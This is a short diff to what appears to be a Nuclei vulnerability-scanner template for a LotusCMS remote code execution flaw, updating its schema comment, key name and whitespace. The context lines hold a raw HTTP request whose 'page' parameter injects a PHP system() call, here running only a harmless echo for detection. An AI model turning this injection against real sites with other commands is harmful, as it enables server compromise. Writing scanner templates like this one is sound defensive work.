@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: lotuscms-rce2
 
 info:
@@ -8,14 +9,14 @@ info:
   tags: lotuscms,rce
 
 
-requests:
+http:
   - raw:
       - |
         POST /lcms/index.php HTTP/1.1
         Host: {{Hostname}}
         User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
         Content-Type: application/x-www-form-urlencoded
-        
+
         page=index');${system('echo lotuscms_rce | md5sum')};#
     matchers-condition: and
     matchers:
